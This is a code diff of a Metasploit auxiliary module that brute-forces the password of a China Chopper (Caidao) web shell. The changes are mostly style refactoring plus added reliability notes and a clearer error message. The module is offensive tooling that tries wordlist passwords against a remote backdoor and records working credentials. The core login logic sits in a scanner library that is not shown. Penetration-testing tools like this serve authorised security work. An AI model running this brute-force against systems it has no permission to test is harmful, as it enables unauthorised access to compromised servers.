@@ -13,19 +13,27 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Chinese Caidao Backdoor Bruteforce',
-      'Description'    => 'This module attempts to bruteforce chinese caidao asp/php/aspx backdoor.',
-      'Author'         => [ 'Nixawk' ],
-      'References'     => [
-        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],
-        ['URL', 'https://www.mandiant.com/resources/breaking-down-the-china-chopper-web-shell-part-ii'],
-        ['URL', 'http://web.archive.org/web/20170214000632/https://www.exploit-db.com/docs/27654.pdf'],
-        ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA15-314A'],
-        ['URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
-      ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Chinese Caidao Backdoor Bruteforce',
+        'Description' => 'This module attempts to bruteforce chinese caidao asp/php/aspx backdoor.',
+        'Author' => [ 'Nixawk' ],
+        'References' => [
+          ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],
+          ['URL', 'https://www.mandiant.com/resources/breaking-down-the-china-chopper-web-shell-part-ii'],
+          ['URL', 'http://web.archive.org/web/20170214000632/https://www.exploit-db.com/docs/27654.pdf'],
+          ['URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA15-314A'],
+          ['URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
+        ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -35,7 +43,8 @@ class MetasploitModule < Msf::Auxiliary
           'The file that contains a list of of probable passwords.',
           File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
         ])
-      ])
+      ]
+    )
 
     # caidao does not have an username, there's only password
     deregister_options('HttpUsername', 'HttpPassword', 'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'DB_ALL_USERS')
@@ -55,13 +64,14 @@ class MetasploitModule < Msf::Auxiliary
           host: ip,
           port: datastore['RPORT'],
           uri: datastore['TARGETURI'],
-          cred_details:       cred_collection,
-          stop_on_success:    datastore['STOP_ON_SUCCESS'],
-          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
+          cred_details: cred_collection,
+          stop_on_success: datastore['STOP_ON_SUCCESS'],
+          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
           connection_timeout: 5,
           http_username: datastore['HttpUsername'],
           http_password: datastore['HttpPassword']
-        ))
+        )
+      )
     }.call
   end
 
@@ -75,10 +85,10 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     credential_data = {
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: result.credential.private,
-      private_type: :password,
+      private_type: :password
     }.merge(service_data)
 
     login_data = {
@@ -109,21 +119,22 @@ class MetasploitModule < Msf::Auxiliary
     scanner(ip).scan! do |result|
       case result.status
       when Metasploit::Model::Login::Status::SUCCESSFUL
-        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential.private}'")
+        print_brute(level: :good, ip: ip, msg: "Success: '#{result.credential.private}'")
         report_good_cred(ip, rport, result)
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
-        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
+        vprint_brute(level: :verror, ip: ip, msg: result.proof)
         report_bad_cred(ip, rport, result)
       when Metasploit::Model::Login::Status::INCORRECT
-        vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential.private}'")
+        vprint_brute(level: :verror, ip: ip, msg: "Failed: '#{result.credential.private}'")
         report_bad_cred(ip, rport, result)
       end
     end
   end
 
   def run_host(ip)
-    unless scanner(ip).check_setup
-      print_brute(:level => :error, :ip => ip, :msg => 'Backdoor type is not support')
+    msg = scanner(ip).check_setup
+    if msg
+      print_brute(level: :error, ip: ip, msg: "Target is not Caidao or backdoor type is not supported - #{msg}")
       return
     end
 
